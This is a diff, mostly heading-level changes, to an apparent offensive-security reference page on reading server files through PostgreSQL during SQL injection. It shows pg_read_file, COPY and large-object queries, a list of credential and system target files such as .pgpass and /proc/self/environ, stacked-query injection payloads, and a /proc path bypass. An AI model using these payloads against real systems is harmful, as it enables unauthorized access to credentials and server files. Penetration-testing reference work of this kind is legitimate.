@@ -7,11 +7,9 @@ tags: ["file operations", "pg_read_file", "privilege escalation"]
 lastUpdated: 2025-12-07
 ---
 
-## Reading Files
-
 PostgreSQL provides functionality to read files from the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
 
-### Prerequisites
+## Prerequisites
 
 To read files from PostgreSQL, you typically need:
 
@@ -20,7 +18,7 @@ To read files from PostgreSQL, you typically need:
   - Membership in the `pg_read_server_files` role (PostgreSQL 11+)
 - **Additionally:** The file must be readable by the `postgres` OS user
 
-### pg_read_file() Function
+## pg_read_file() Function
 
 The primary method for reading files (requires superuser):
 
@@ -35,7 +33,7 @@ SELECT pg_read_file('/etc/passwd', 0, 100);
 SELECT pg_read_file('/etc/passwd', missing_ok => true);
 ```
 
-### pg_read_binary_file() Function
+## pg_read_binary_file() Function
 
 For reading binary files:
 
@@ -46,7 +44,7 @@ SELECT pg_read_binary_file('/path/to/file');
 SELECT encode(pg_read_binary_file('/path/to/binary'), 'hex');
 ```
 
-### Using COPY
+## Using COPY
 
 The `COPY` command can read files into a table:
 
@@ -64,7 +62,7 @@ SELECT * FROM file_contents;
 DROP TABLE file_contents;
 ```
 
-### Using Large Objects
+## Using Large Objects
 
 Large objects can be used for file operations. The simplest approach uses `lo_import` and `lo_export`:
 
@@ -101,7 +99,7 @@ SELECT convert_from(lo_get(12345), 'UTF8');
 
 **Note:** The older transaction-based API (`lo_open`/`loread`) exists but offers no advantage over `lo_get()` for SQL injection and requires stacked queries with file descriptor management.
 
-### pg_ls_dir() Function
+## pg_ls_dir() Function
 
 List directory contents (requires superuser):
 
@@ -113,7 +111,7 @@ SELECT pg_ls_dir('/etc');
 SELECT pg_ls_dir(current_setting('data_directory'));
 ```
 
-### Important Target Files
+## Important Target Files
 
 | File Path                                  | Description                       |
 | ------------------------------------------ | --------------------------------- |
@@ -126,7 +124,7 @@ SELECT pg_ls_dir(current_setting('data_directory'));
 | `/proc/self/environ`                       | Environment variables             |
 | `/var/lib/postgresql/.pgpass`              | PostgreSQL password file          |
 
-### Configuration File Locations
+## Configuration File Locations
 
 ```sql
 -- Get config file location
@@ -139,7 +137,7 @@ SELECT current_setting('hba_file');
 SELECT current_setting('data_directory');
 ```
 
-### Injection Examples
+## Injection Examples
 
 ```sql
 -- Read /etc/passwd
@@ -155,9 +153,9 @@ SELECT current_setting('data_directory');
 '; CREATE TABLE temp(data TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp--
 ```
 
-### Bypassing Restrictions
+## Bypassing Restrictions
 
-#### Using Symlinks (Linux only)
+### Using Symlinks (Linux only)
 
 If direct paths are blocked, `/proc` filesystem paths may bypass restrictions on Linux systems:
 
@@ -168,7 +166,7 @@ SELECT pg_read_file('/proc/self/root/etc/passwd');
 
 **Note:** The `/proc` filesystem is Linux-specific. On Windows, PostgreSQL paths and bypass techniques differ entirely (e.g., `C:\Windows\System32\drivers\etc\hosts`).
 
-#### Encoding Output
+### Encoding Output
 
 For binary files or to avoid display issues:
 
@@ -177,14 +175,14 @@ SELECT encode(pg_read_file('/etc/passwd')::bytea, 'base64');
 SELECT encode(pg_read_file('/etc/passwd')::bytea, 'hex');
 ```
 
-### PostgreSQL 11+ Role-Based Access
+## PostgreSQL 11+ Role-Based Access
 
 ```sql
 -- Check if user has file read privileges
 SELECT pg_has_role(current_user, 'pg_read_server_files', 'member');
 ```
 
-### Notes
+## Notes
 
 - `pg_read_file()` requires superuser privileges by default; file access is constrained by the OS permissions of the postgres user
 - PostgreSQL 11+ introduced the `pg_read_server_files` role, which allows non-superusers to read server files under the same OS permission constraints
